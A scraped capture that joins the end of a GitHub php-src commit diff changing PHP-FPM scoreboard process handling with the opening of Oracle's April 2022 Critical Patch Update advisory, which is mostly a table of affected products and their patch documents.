|  |  | float fpm\_scoreboard\_get\_tick(); |
| Expand Down | |  |

4 changes: 2 additions & 2 deletions

4
[sapi/fpm/fpm/fpm\_status.c](#diff-838af21e79da4e7bd0e5c8a70aff09feda8066550d75c8fb1a6e9db674e431b5 "sapi/fpm/fpm/fpm_status.c")

Show comments

[View file](/php/php-src/blob/f47798e685e5c97ba52fe7c9bf408a5b92ab5b6a/sapi/fpm/fpm/fpm_status.c)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -498,10 +498,10 @@ int fpm\_status\_handle\_request(void) /\* {{{ \*/ |
|  |  |  |
|  |  | first = 1; |
|  |  | for (i=0; i<scoreboard\_p->nprocs; i++) { |
|  |  | if (!scoreboard\_p->procs[i] || !scoreboard\_p->procs[i]->used) { |
|  |  | if (!scoreboard\_p->procs[i].used) { |
|  |  | continue; |
|  |  | } |
|  |  | proc = \*scoreboard\_p->procs[i]; |
|  |  | proc = scoreboard\_p->procs[i]; |
|  |  |  |
|  |  | if (first) { |
|  |  | first = 0; |
| Expand Down | |  |

2 changes: 1 addition & 1 deletion

2
[sapi/fpm/fpm/fpm\_worker\_pool.c](#diff-3ed2a6a89d2e60c82de36155bb1e27aba222471c5721a0c0c4322b88ee08ac42 "sapi/fpm/fpm/fpm_worker_pool.c")

Show comments

[View file](/php/php-src/blob/f47798e685e5c97ba52fe7c9bf408a5b92ab5b6a/sapi/fpm/fpm/fpm_worker_pool.c)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -42,7 +42,7 @@ static void fpm\_worker\_pool\_cleanup(int which, void \*arg) /\* {{{ \*/ |
|  |  | fpm\_worker\_pool\_config\_free(wp->config); |
|  |  | fpm\_children\_free(wp->children); |
|  |  | if ((which & FPM\_CLEANUP\_CHILD) == 0 && fpm\_globals.parent\_pid == getpid()) { |
|  |  | fpm\_scoreboard\_free(wp->scoreboard); |
|  |  | fpm\_scoreboard\_free(wp); |
|  |  | } |
|  |  | fpm\_worker\_pool\_free(wp); |
|  |  | } |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `f47798e`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fphp%2Fphp-src%2Fcommit%2Ff47798e685e5c97ba52fe7c9bf408a5b92ab5b6a) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from www.oracle.com_f2d78ea9_20250114_195338.html ===


* [Skip to content](#maincontent)
* [Accessibility Policy](https://www.oracle.com/corporate/accessibility/)

Products
Industries
Resources
Customers
Partners
Developers
Company

Close Search

Search Oracle.com

* QUICK LINKS
* [Oracle Cloud Infrastructure](/cloud/)
* [Oracle Fusion Cloud Applications](/applications/)
* [Oracle Database](/database/technologies/)
* [Download Java](/java/technologies/downloads/)
* [Careers at Oracle](/careers/)

Search

[Country
![]()](/countries-list.html#countries)

View Accounts

Back
Cloud Account
[Sign in to Cloud](/cloud/sign-in.html)
[Sign Up for Free Cloud Tier](/cloud/free/)

Oracle Account

* [Sign-In](https://www.oracle.com/webapps/redirect/signon?nexturl=)
* [Create an Account](https://profile.oracle.com/myprofile/account/create-account.jspx)

* [Help](/corporate/contact/help.html)
* Sign Out

[Contact Sales](/corporate/contact/ "Contact Sales")

[Menu

Menu](/global-menu-v2/)

## Oracle Critical Patch Update Advisory - April 2022

### Description

A Critical Patch Update is a collection of patches for multiple security vulnerabilities.  These patches address vulnerabilities in Oracle code and in third-party components included in Oracle products.  These patches are usually cumulative, but each advisory describes only the security patches added since the previous Critical Patch Update Advisory. Thus, prior Critical Patch Update advisories should be reviewed for information regarding earlier published security patches.  Refer to [“Critical Patch Updates, Security Alerts and Bulletins”](https://www.oracle.com/security-alerts/) for information about Oracle Security advisories.

**Oracle continues to periodically receive reports of attempts to maliciously exploit vulnerabilities for which Oracle has already released security patches. In some instances, it has been reported that attackers have been successful because targeted customers had failed to apply available Oracle patches. Oracle therefore strongly recommends that customers remain on actively-supported versions and apply Critical Patch Update security patches without delay.**

This Critical Patch Update contains 520 new security patches across the product families listed below. Please note that an MOS note summarizing the content of this Critical Patch Update and other Oracle Software Security Assurance activities is located at  [April 2022 Critical Patch Update: Executive Summary and Analysis](https://support.oracle.com/rs?type=doc&id=2857016.1).

### Affected Products and Patch Information

Security vulnerabilities addressed by this Critical Patch Update affect the products listed below. The product area is shown in the Patch Availability Document column.

**Please click on the links in the Patch Availability Document column below to access the documentation for patch availability information and installation instructions.**

| Affected Products and Versions | Patch Availability Document |
| --- | --- |
| [Engineered Systems Utilities, versions 12.1.0.2, 19c, 21c](#AppendixAHTF) | [Oracle Autonomous Health Framework](https://support.oracle.com/rs?type=doc&id=2844795.1) |
| [Enterprise Manager Base Platform, versions 13.4.0.0, 13.5.0.0](#AppendixEM) | [Enterprise Manager](https://support.oracle.com/rs?type=doc&id=2844807.1 ) |
| [Enterprise Manager for Peoplesoft, versions 13.4.1.1, 13.5.1.1](#AppendixEM) | [Enterprise Manager](https://support.oracle.com/rs?type=doc&id=2844807.1 ) |
| [Enterprise Manager for Storage Management, version 13.4.0.0](#AppendixEM) | [Enterprise Manager](https://support.oracle.com/rs?type=doc&id=2844807.1 ) |
| [Enterprise Manager Ops Center, version 12.4.0.0](#AppendixEM) | [Enterprise Manager](https://support.oracle.com/rs?type=doc&id=2844807.1 ) |
| [Helidon, versions 1.4.7, 1.4.10, 2.0.0-RC1](#AppendixFMW) | [Helidon](https://support.oracle.com/rs?type=doc&id=2645279.1) |
| [Instantis EnterpriseTrack, versions 17.1, 17.2, 17.3](#AppendixPVA) | [Oracle Construction and Engineering Suite](https://support.oracle.com/rs?type=doc&id=2856639.1) |
| [JD Edwards EnterpriseOne Tools, versions prior to 9.2.6.3](#AppendixJDE) | [JD Edwards](https://support.oracle.com/rs?type=doc&id=2858978.1) |
| [JD Edwards World Security, version A9.4](#AppendixJDE) | [JD Edwards](https://support.oracle.com/rs?type=doc&id=2858978.1) |
| [Management Cloud Engine, versions 1.5.0 and prior](#AppendixCGBU) | [Oracle Management Cloud Engine](https://support.oracle.com/rs?type=doc&id=2859067.1) |
| [Middleware Common Libraries and Tools, versions 12.2.1.3.0, 12.2.1.4.0, 14.1.1.0.0](#AppendixFMW) | [Fusion Middleware](https://support.oracle.com/rs?type=doc&id=2853458.2) |
| [MySQL Cluster, versions 7.4.35 and prior, 7.5.25 and prior, 7.6.21 and prior, 8.0.28 and prior](#AppendixMSQL) | [MySQL](https://support.oracle.com/rs?type=doc&id=2856097.1) |
| [MySQL Connectors, versions 8.0.28 and prior](#AppendixMSQL) | [MySQL](https://support.oracle.com/rs?type=doc&id=2856097.1) |
| [MySQL Enterprise Monitor, versions 8.0.29 and prior](#AppendixMSQL) | [MySQL](https://support.oracle.com/rs?type=doc&id=2856097.1) |
| [MySQL Server, versions 5.7.37 and prior, 8.0.28 and prior](#AppendixMSQL) | [MySQL](https://support.oracle.com/rs?type=doc&id=2856097.1) |
| [MySQL Workbench, versions 8.0.28 and prior](#AppendixMSQL) | [MySQL](https://support.oracle.com/rs?type=doc&id=2856097.1) |
| [Oracle Advanced Supply Chain Planning, versions 12.1, 12.2](#AppendixSCP) | [Oracle Supply Chain Products](https://support.oracle.com/rs?type=doc&id=2858979.1) |
| [Oracle Agile Engineering Data Management, version 6.2.1.0](#AppendixSCP) | [Oracle Supply Chain Products](https://support.oracle.com/rs?type=doc&id=2858979.1) |
| [Oracle Agile PLM, version 9.3.6](#AppendixSCP) | [Oracle Supply Chain Products](https://support.oracle.com/rs?type=doc&id=2858979.1) |
| [Oracle Agile PLM MCAD Connector, version 3.6](#AppendixSCP) | [Oracle Supply Chain Products](https://support.oracle.com/rs?type=doc&id=2858979.1) |
| [Oracle Application Development Framework (ADF), versions 12.2.1.3.0, 12.2.1.4.0](#AppendixFMW) | [Fusion Middleware](https://support.oracle.com/rs?type=doc&id=2853458.2) |
| [Oracle Application Express, versions prior to 22.1](#AppendixDB) | [Database](https://support.oracle.com/rs?type=doc&id=2844795.1) |
| [Oracle Application Testing Suite, version 13.3.0.1](#AppendixEM) | [Enterprise Manager](https://support.oracle.com/rs?type=doc&id=2844807.1 ) |
| [Oracle Autovue for Agile Product Lifecycle Management, version 21.0.2](#AppendixSCP) | [Oracle Supply Chain Products](https://support.oracle.com/rs?type=doc&id=2858979.1) |
| [Oracle Banking Deposits and Lines of Credit Servicing, version 2.12.0](#AppendixIFLX) | [Contact Support](https://support.oracle.com) |
| [Oracle Banking Enterprise Default Management, versions 2.7.1, 2.10.0, 2.12.0](#AppendixIFLX) | [Oracle Banking Platform](https://support.oracle.com/rs?type=doc&id=2861653.1) |
| [Oracle Banking Loans Servicing, version 2.12.0](#AppendixIFLX) | [Contact Support](https://support.oracle.com) |
| [Oracle Banking Party Management, version 2.7.0](#AppendixIFLX) | [Oracle Banking Platform](https://support.oracle.com/rs?type=doc&id=2861653.1) |
| [Oracle Banking Payments, version 14.5](#AppendixIFLX) | [Contact Support](https://support.oracle.com) |
| [Oracle Banking Platform, versions 2.6.2, 2.7.1, 2.12.0](#AppendixIFLX) | [Oracle Banking Platform](https://support.oracle.com/rs?type=doc&id=2861653.1) |
| [Oracle Banking Trade Finance, version 14.5](#AppendixIFLX) | [Contact Support](https://support.oracle.com) |
| [Oracle Banking Treasury Management, version 14.5](#AppendixIFLX) | [Contact Support](https://support.oracle.com) |
| [Oracle Blockchain Platform, versions prior to 21.1.2](#AppendixBP) | [Oracle Blockchain Platform](https://support.oracle.com/rs?type=doc&id=2844795.1) |
| [Oracle Business Intelligence Enterprise Edition, versions 5.5.0.0.0, 5.9.0.0.0, 12.2.1.3.0, 12.2.1.4.0](#AppendixFMW) | [Oracle Analytics](https://support.oracle.com/rs?type=doc&id=2853459.2) |
| [Oracle Business Process Management Suite, versions 12.2.1.3.0, 12.2.1.4.0](#AppendixFMW) | [Fusion Middleware](https://support.oracle.com/rs?type=doc&id=2853458.2) |
| [Oracle Coherence, versions 12.2.1.3.0, 12.2.1.4.0, 14.1.1.0.0](#AppendixFMW) | [Fusion Middleware](https://support.oracle.com/rs?type=doc&id=2853458.2) |
| [Oracle Commerce Guided Search, version 11.3.2](#AppendixOCOM) | [Oracle Commerce](https://support.oracle.com/rs?type=doc&id=2859309.1) |
| [Oracle Communications ASAP, version 7.3](#AppendixCAGBU) | [Oracle Communications ASAP](https://support.oracle.com/rs?type=doc&id=2856716.1) |
| [Oracle Communications Billing and Revenue Management, versions 12.0.0.4, 12.0.0.5](#AppendixCAGBU) | [Oracle Communications Billing and Revenue Management](https://support.oracle.com/rs?type=doc&id=2856675.1) |
| [Oracle Communications Cloud Native Core Automated Test Suite, versions 1.8.0, 1.9.0, 22.1.0](#AppendixCGBU) | [Oracle Communications Cloud Native Core Automated Test Suite](https://support.oracle.com/rs?type=doc&id=2859046.1) |
| [Oracle Communications Cloud Native Core Binding Support Function, version 1.11.0](#AppendixCGBU) | [Oracle Communications Cloud Native Core Binding Support Function](https://support.oracle.com/rs?type=doc&id=2859047.1) |
| [Oracle Communications Cloud Native Core Console, versions 1.9.0, 22.1.0](#AppendixCGBU) | [Oracle Communications Cloud Native Core Console](https://support.oracle.com/rs?type=doc&id=2859048.1) |
| [Oracle Communications Cloud Native Core Network Exposure Function, version 22.1.0](#AppendixCGBU) | [Oracle Communications Cloud Native Core Network Exposure Function](https://support.oracle.com/rs?type=doc&id=2863903.1) |
| [Oracle Communications Cloud Native Core Network Function Cloud Native Environment, versions 1.10.0, 22.1.0](#AppendixCGBU) | [Oracle Communications Cloud Native Core Network Function Cloud Native Environment](https://support.oracle.com/rs?type=doc&id=2861795.1) |
| [Oracle Communications Cloud Native Core Network Repository Function, versions 1.15.0, 1.15.1, 22.1.0](#AppendixCGBU) | [Oracle Communications Cloud Native Core Network Repository Function](https://support.oracle.com/rs?type=doc&id=2861796.1) |
| [Oracle Communications Cloud Native Core Network Slice Selection Function, versions 1.8.0, 22.1.0](#AppendixCGBU) | [Oracle Communications Cloud Native Core Network Slice Selection Function](https://support.oracle.com/rs?type=doc&id=2861807.1) |
| [Oracle Communications Cloud Native Core Policy, versions 1.14.0, 1.15.0, 22.1.0](#AppendixCGBU) | [Oracle Communications Cloud Native Core Policy](https://support.oracle.com/rs?type=doc&id=2859049.1) |
| [Oracle Communications Cloud Native Core Security Edge Protection Proxy, versions 1.7.0, 22.1.0](#AppendixCGBU) | [Oracle Communications Cloud Native Core Security Edge Protection Proxy](https://support.oracle.com/rs?type=doc&id=2859050.1) |
| [Oracle Communications Cloud Native Core Service Communication Proxy, version 1.15.0](#AppendixCGBU) | [Oracle Communications Cloud Native Core Service Communication Proxy](https://support.oracle.com/rs?type=doc&id=2859052.1) |
| [Oracle Communications Cloud Native Core Unified Data Repository, versions 1.15.0, 22.1.0](#AppendixCGBU) | [Oracle Communications Cloud Native Core Unified Data Repository](https://support.oracle.com/rs?type=doc&id=2859053.1) |
| [Oracle Communications Contacts Server, version 8.0.0.6.0](#AppendixCAGBU) | [Oracle Communications Contacts Server](https://support.oracle.com/rs?type=doc&id=2856674.1) |
| [Oracle Communications Convergence, versions 3.0.2.2, 3.0.3.0](#AppendixCAGBU) | [Oracle Communications Convergence](https://support.oracle.com/rs?type=doc&id=2856674.1) |
| [Oracle Communications Convergent Charging Controller, versions 6.0.1.0.0, 12.0.1.0.0-12.0.4.0.0](#AppendixCAGBU) | [Oracle Communications Convergent Charging Controller](https://support.oracle.com/rs?type=doc&id=2856694.1) |
| [Oracle Communications Design Studio, versions 7.3.5, 7.4.0-7.4.2](#AppendixCAGBU) | [Oracle Communications Design Studio](https://support.oracle.com/rs?type=doc&id=2856707.1) |
| [Oracle Communications Diameter Intelligence Hub, versions 8.0.0-8.2.3](#AppendixCGBU) | [Oracle Communications Diameter Signaling Router](https://support.oracle.com/rs?type=doc&id=2859054.1) |
| [Oracle Communications Diameter Signaling Router, version 8.4.0.0](#AppendixCGBU) | [Oracle Communications Diameter Signaling Router](https://support.oracle.com/rs?type=doc&id=2859055.1) |
| [Oracle Communications EAGLE Application Processor](#AppendixCGBU) | [Oracle Communications EAGLE Application Processor](https://support.oracle.com/rs?type=doc&id=2861811.1) |
| [Oracle Communications EAGLE Element Management System, version 46.6](#AppendixCGBU) | [Oracle Communications EAGLE Element Management System](https://support.oracle.com/rs?type=doc&id=2859068.1) |
| [Oracle Communications EAGLE FTP Table Base Retrieval, version 4.5](#AppendixCGBU) | [Oracle Communications EAGLE FTP Table Base Retrieval](https://support.oracle.com/rs?type=doc&id=2861832.1) |
| [Oracle Communications EAGLE LNP Application Processor, versions 10.1, 10.2](#AppendixCGBU) | [Oracle Communications EAGLE LNP Application Processor](https://support.oracle.com/rs?type=doc&id=2861828.1) |
| [Oracle Communications EAGLE Software, versions 46.7.0, 46.8.0-46.8.2, 46.9.1-46.9.3](#AppendixCGBU) | [Oracle Communications EAGLE (Software)](https://support.oracle.com/rs?type=doc&id=2861808.1) |
| [Oracle Communications Element Manager, versions prior to 9.0](#AppendixCGBU) | [Oracle Communications Element Manager](https://support.oracle.com/rs?type=doc&id=2859056.1) |
| [Oracle Communications Evolved Communications Application Server, version 7.1](#AppendixCGBU) | [Oracle Communications Evolved Communications Application Server](https://support.oracle.com/rs?type=doc&id=2859057.1) |
| [Oracle Communications Instant Messaging Server, version 10.0.1.5.0](#AppendixCAGBU) | [Oracle Communications Instant Messaging Server](https://support.oracle.com/rs?type=doc&id=2856674.1) |
| [Oracle Communications Interactive Session Recorder, version 6.4](#AppendixCGBU) | [Oracle Communications Interactive Session Recorder](https://support.oracle.com/rs?type=doc&id=2859058.1) |
| [Oracle Communications IP Service Activator, version 7.4.0](#AppendixCAGBU) | [Oracle Communications IP Service Activator](https://support.oracle.com/rs?type=doc&id=2856708.1) |
| [Oracle Communications Messaging Server, version 8.1](#AppendixCAGBU) | [Oracle Communications Messaging Server](https://support.oracle.com/rs?type=doc&id=2856674.1) |
| [Oracle Communications MetaSolv Solution, version 6.3.1](#AppendixCAGBU) | [Oracle Communications MetaSolv Solution](https://support.oracle.com/rs?type=doc&id=2856717.1) |
| [Oracle Communications Network Charging and Control, versions 6.0.1.0.0, 12.0.1.0.0-12.0.4.0.0](#AppendixCAGBU) | [Oracle Communications Network Charging and Control](https://support.oracle.com/rs?type=doc&id=2856694.1) |
| [Oracle Communications Network Integrity, versions 7.3.2, 7.3.5, 7.3.6](#AppendixCAGBU) | [Oracle Communications Network Integrity](https://support.oracle.com/rs?type=doc&id=2856673.1) |
| [Oracle Communications Operations Monitor, versions 4.3, 4.4, 5.0](#AppendixCGBU) | [Oracle Communications Operations Monitor](https://support.oracle.com/rs?type=doc&id=2859059.1) |
| [Oracle Communications Order and Service Management, versions 7.3, 7.4](#AppendixCAGBU) | [Oracle Communications Order and Service Management](https://support.oracle.com/rs?type=doc&id=2856706.1) |
| [Oracle Communications Performance Intelligence Center (PIC) Software, versions 10.3.0.0.0-10.3.0.2.1, 10.4.0.1.0-10.4.0.3.1](#AppendixCGBU) | [Oracle Communications Performance Intelligence Center (PIC) Software](https://support.oracle.com/rs?type=doc&id=2859060.1) |
| [Oracle Communications Policy Management, versions 12.5.0.0.0, 12.6.0.0.0](#AppendixCGBU) | [Oracle Communications Policy Management](https://support.oracle.com/rs?type=doc&id=2859061.1) |
| [Oracle Communications Pricing Design Center, versions 12.0.0.4, 12.0.0.5](#AppendixCAGBU) | [Oracle Communications Pricing Design Center](https://support.oracle.com/rs?type=doc&id=2856675.1) |
| [Oracle Communications Services Gatekeeper, version 7.0.0.0.0](#AppendixCGBU) | [Oracle Communications Services Gatekeeper](https://support.oracle.com/rs?type=doc&id=2859062.1) |
| [Oracle Communications Session Border Controller, versions 8.4, 9.0](#AppendixCGBU) | [Oracle Communications Session Border Controller](https://support.oracle.com/rs?type=doc&id=2858583.1) |
| [Oracle Communications Session Report Manager, versions prior to 9.0](#AppendixCGBU) | [Oracle Communications Session Report Manager](https://support.oracle.com/rs?type=doc&id=2859063.1) |
| [Oracle Communications Session Route Manager, versions prior to 9.0](#AppendixCGBU) | [Oracle Communications Session Route Manager](https://support.oracle.com/rs?type=doc&id=2859064.1) |
| [Oracle Communications Unified Inventory Management, versions 7.3.4-7.3.5, ,7.4.1-7.4.2](#AppendixCAGBU) | [Oracle Communications Unified Inventory Management](https://support.oracle.com/rs?type=doc&id=2856709.1) |
| [Oracle Communications Unified Session Manager, versions 8.2.5, 8.4.5](#AppendixCGBU) | [Oracle Communications Unified Session Manager](https://support.oracle.com/rs?type=doc&id=2858584.1) |
| [Oracle Communications User Data Repository, version 12.4](#AppendixCGBU) | [Oracle Communications User Data Repository](https://support.oracle.com/rs?type=doc&id=2862337.1) |
| [Oracle Communications WebRTC Session Controller, version 7.2.1](#AppendixCGBU) | [Oracle Communications WebRTC Session Controller](https://support.oracle.com/rs?type=doc&id=2861922.1) |
| [Oracle Data Integrator, versions 12.2.1.3.0, 12.2.1.4.0](#AppendixFMW) | [Fusion Middleware](https://support.oracle.com/rs?type=doc&id=2853458.2) |
| [Oracle Database Server, versions 12.1.0.2, 19c, 21c](#AppendixDB) | [Database](https://support.oracle.com/rs?type=doc&id=2844795.1) |
| [Oracle Documaker, versions 12.6.0, 12.6.2-12.6.4, 12.7.0](#AppendixINSU) | [Oracle Insurance Applications](https://support.oracle.com/rs?type=doc&id=2857284.1) |
| [Oracle E-Business Suite, versions 12.2.4-12.2.11, [EBS Cloud Manager and Backup Module] prior to 22.1.1.1, [Enterprise Command Center] 7.0, [Enterprise Information Discovery] 7-9](#AppendixEBS) | [Oracle E-Business Suite](https://support.oracle.com/rs?type=doc&id=2484000.1) |
| [Oracle Enterprise Communications Broker, versions 3.2, 3.3](#AppendixCGBU) | [Oracle Enterprise Communications Broker](https://support.oracle.com/rs?type=doc&id=2858599.1) |
| [Oracle Enterprise Session Border Controller, versions 8.4, 9.0](#AppendixCGBU) | [Oracle Enterprise Session Border Controller](https://support.oracle.com/rs?type=doc&id=2858583.1) |
| [Oracle Ethernet Switch ES1-24, version 1.3.1](#AppendixSUNS) | [Systems](https://support.oracle.com/rs?type=doc&id=2857179.1) |
| [Oracle Ethernet Switch TOR-72, version 1.2.2](#AppendixSUNS) | [Systems](https://support.oracle.com/rs?type=doc&id=2857179.1) |
| [Oracle Financial Services Analytical Applications Infrastructure, versions 8.0.6.0-8.0.9.0, 8.1.0.0-8.1.2.0](#AppendixIFLX) | [Oracle Financial Services Analytical Applications Infrastructure](https://support.oracle.com/rs?type=doc&id=2856189.1) |
| [Oracle Financial Services Behavior Detection Platform, versions 8.0.6.0-8.0.8.0, 8.1.1.0, 8.1.1.1, 8.1.2.0](#AppendixIFLX) | [Oracle Financial Services Behavior Detection Platform](https://support.oracle.com/rs?type=doc&id=2863604.1) |
| [Oracle Financial Services Enterprise Case Management, versions 8.0.7.1, 8.0.7.2, 8.0.8.0, 8.0.8.1, 8.1.1.0, 8.1.1.1, 8.1.2.0](#AppendixIFLX) | [Oracle Financial Services Enterprise Case Management](https://support.oracle.com/rs?type=doc&id=2856550.1) |
| [Oracle Financial Services Revenue Management and Billing, versions 2.7.0.0, 2.7.0.1, 2.8.0.0](#AppendixIFLX) | [Oracle Financial Services Revenue Management and Billing](https://support.oracle.com/rs?type=doc&id=2860692.1) |
| [Oracle FLEXCUBE Universal Banking, versions 11.83.3, 12.1-12.4, 14.0-14.3, 14.5](#AppendixIFLX) | [Contact Support](https://support.oracle.com) |
| [Oracle Global Lifecycle Management OPatch](#AppendixGLM) | [Global Lifecycle Management](https://support.oracle.com/rs?type=doc&id=2853458.2) |
| [Oracle GoldenGate, versions prior to 12.3.0.1.2, prior to 23.1](#AppendixGG) | [Database](https://support.oracle.com/rs?type=doc&id=2844795.1) |
| [Oracle GoldenGate Application Adapters, versions prior to 23.1](#AppendixGG) | [Database](https://support.oracle.com/rs?type=doc&id=2844795.1) |
| [Oracle GoldenGate Big Data and Application Adapters, versions prior to 23.1](#AppendixGG) | [Database](https://support.oracle.com/rs?type=doc&id=2844795.1) |
| [Oracle GraalVM Enterprise Edition, versions 20.3.5, 21.3.1, 22.0.0.2](#AppendixJAVA) | [Java SE](https://support.oracle.com/rs?type=doc&id=2855980.1) |
| [Oracle Health Sciences Empirica Signal, versions 9.1.0.6, 9.2.0.0](#AppendixHCAR) | [Health Sciences](https://support.oracle.com/rs?type=doc&id=2854079.1) |
| [Oracle Health Sciences InForm, versions 6.2.1.1, 6.3.2.1, 7.0.0.0](#AppendixHCAR) | [Health Sciences](https://support.oracle.com/rs?type=doc&id=2854079.1) |
| [Oracle Health Sciences InForm Publisher, versions 6.2.1.0, 6.3.1.1](#AppendixHCAR) | [Health Sciences](https://support.oracle.com/rs?type=doc&id=2854079.1) |
| [Oracle Health Sciences Information Manager, versions 3.0.1-3.0.4](#AppendixHC) | [HealthCare Applications](https://support.oracle.com/rs?type=doc&id=2862542.1) |
| [Oracle Healthcare Data Repository, versions 8.1.0, 8.1.1](#AppendixHC) | [HealthCare Applications](https://support.oracle.com/rs?type=doc&id=2862542.1) |
| [Oracle Healthcare Foundation, versions 7.3.0.1-7.3.0.4](#AppendixHC) | [HealthCare Applications](https://support.oracle.com/rs?type=doc&id=2862542.1) |
| [Oracle Healthcare Master Person Index, version 5.0.1](#AppendixHC) | [HealthCare Applications](https://support.oracle.com/rs?type=doc&id=2862542.1) |
| [Oracle Healthcare Translational Research, versions 4.1.0, 4.1.1](#AppendixHC) | [HealthCare Applications](https://support.oracle.com/rs?type=doc&id=2862542.1) |
| [Oracle Hospitality Suite8, versions 8.10.2, 8.11.0-8.14.0](#AppendixHOSP) | [Oracle Hospitality Suite8](https://support.oracle.com/rs?type=doc&id=2857213.1) |
| [Oracle Hospitality Token Proxy Service, version 19.2](#AppendixHOSP) | [Oracle Hospitality Token Proxy Service](https://support.oracle.com/rs?type=doc&id=2859245.1) |
| [Oracle HTTP Server, versions 12.2.1.3.0, 12.2.1.4.0](#AppendixFMW) | [Fusion Middleware](https://support.oracle.com/rs?type=doc&id=2853458.2) |
| [Oracle Hyperion BI+, versions prior to 11.2.8.0](#AppendixHYP) | [Oracle Enterprise Performance Management](https://support.oracle.com/rs?type=doc&id=2775466.2) |
| [Oracle Hyperion Calculation Manager, versions prior to 11.2.8.0](#AppendixHYP) | [Oracle Enterprise Performance Management](https://support.oracle.com/rs?type=doc&id=2775466.2) |
| [Oracle Hyperion Data Relationship Management, versions prior to 11.2.8.0, prior to 11.2.9.0](#AppendixHYP) | [Oracle Enterprise Performance Management](https://support.oracle.com/rs?type=doc&id=2775466.2) |
| [Oracle Hyperion Financial Management, versions prior to 11.2.8.0](#AppendixHYP) | [Oracle Enterprise Performance Management](https://support.oracle.com/rs?type=doc&id=2775466.2) |
| [Oracle Hyperion Infrastructure Technology, versions prior to 11.2.8.0](#AppendixHYP) | [Oracle Enterprise Performance Management](https://support.oracle.com/rs?type=doc&id=2775466.2) |
| [Oracle Hyperion Planning, versions prior to 11.2.8.0](#AppendixHYP) | [Oracle Enterprise Performance Management](https://support.oracle.com/rs?type=doc&id=2775466.2) |
| [Oracle Hyperion Profitability and Cost Management, versions prior to 11.2.8.0](#AppendixHYP) | [Oracle Enterprise Performance Management](https://support.oracle.com/rs?type=doc&id=2775466.2) |
| [Oracle Hyperion Tax Provision, versions prior to 11.2.8.0](#AppendixHYP) | [Oracle Enterprise Performance Management](https://support.oracle.com/rs?type=doc&id=2775466.2) |
| [Oracle Identity Management Suite, versions 12.2.1.3.0, 12.2.1.4.0](#AppendixFMW) | [Fusion Middleware](https://support.oracle.com/rs?type=doc&id=2853458.2) |
| [Oracle Identity Manager Connector, versions 9.1.0](#AppendixFMW) | [Fusion Middleware](https://support.oracle.com/rs?type=doc&id=2853458.2) |
| [Oracle iLearning, versions 6.2, 6.3](#AppendixILRN) | [iLearning](https://support.oracle.com/rs?type=doc&id=2859330.1) |
| [Oracle Insurance Data Gateway, version 1.0.1](#AppendixINSU) | [Oracle Insurance Applications](https://support.oracle.com/rs?type=doc&id=2857284.1) |
| [Oracle Insurance Insbridge Rating and Underwriting, versions 5.2.0, 5.4.0-5.6.0, 5.6.1](#AppendixINSU) | [Oracle Insurance Applications](https://support.oracle.com/rs?type=doc&id=2857284.1) |
| [Oracle Insurance Policy Administration, versions 11.0.2, 11.1.0, 11.2.8, 11.3.0, 11.3.1](#AppendixINSU) | [Oracle Insurance Applications](https://support.oracle.com/rs?type=doc&id=2857284.1) |
| [Oracle Insurance Rules Palette, versions 11.0.2, 11.1.0, 11.2.8, 11.3.0, 11.3.1](#AppendixINSU) | [Oracle Insurance Applications](https://support.oracle.com/rs?type=doc&id=2857284.1) |
| [Oracle Internet Directory, versions 12.2.1.3.0, 12.2.1.4.0](#AppendixFMW) | [Fusion Middleware](https://support.oracle.com/rs?type=doc&id=2853458.2) |
| [Oracle Java SE, versions 7u331, 8u321, 11.0.14, 17.0.2, 18](#AppendixJAVA) | [Java SE](https://support.oracle.com/rs?type=doc&id=2855980.1) |
| [Oracle JDeveloper, versions 12.2.1.3.0, 12.2.1.4.0](#AppendixFMW) | [Fusion Middleware](https://support.oracle.com/rs?type=doc&id=2853458.2) |
| [Oracle Managed File Transfer, versions 12.2.1.3.0, 12.2.1.4.0](#AppendixFMW) | [Fusion Middleware](https://support.oracle.com/rs?type=doc&id=2853458.2) |
| [Oracle Middleware Common Libraries and Tools, version 12.2.1.4.0](#AppendixFMW) | [Fusion Middleware](https://support.oracle.com/rs?type=doc&id=2853458.2) |
| [Oracle NoSQL Database](#AppendixNSQL) | [NoSQL Database](https://support.oracle.com/rs?type=doc&id=2844795.1) |
| [Oracle Outside In Technology, versions 8.5.5, 8.5.6](#AppendixFMW) | [Fusion Middleware](https://support.oracle.com/rs?type=doc&id=2853458.2) |
| [Oracle Payment Interface, versions 19.1, 20.3](#AppendixHOSP) | [Oracle Payment Interface](https://support.oracle.com/rs?type=doc&id=2859245.1) |
| [Oracle Product Lifecycle Analytics, version 3.6.1.0](#AppendixSCP) | [Oracle Supply Chain Products](https://support.oracle.com/rs?type=doc&id=2858979.1) |
| [Oracle REST Data Services, versions prior to 21.2](#AppendixREST) | [Database](https://support.oracle.com/rs?type=doc&id=2844795.1) |
| [Oracle Retail Bulk Data Integration, version 16.0.3](#AppendixRAPP) | [Retail Applications](https://support.oracle.com/rs?type=doc&id=2855697.1) |
| [Oracle Retail Customer Insights, versions 15.0.2, 16.0.2](#AppendixRAPP) | [Retail Applications](https://support.oracle.com/rs?type=doc&id=2855697.1) |
| [Oracle Retail Customer Management and Segmentation Foundation, versions 17.0-19.0](#AppendixRAPP) | [Retail Applications](https://support.oracle.com/rs?type=doc&id=2855697.1) |
| [Oracle Retail Data Extractor for Merchandising, versions 15.0.2, 16.0.2](#AppendixRAPP) | [Retail Applications](https://support.oracle.com/rs?type=doc&id=2855697.1) |
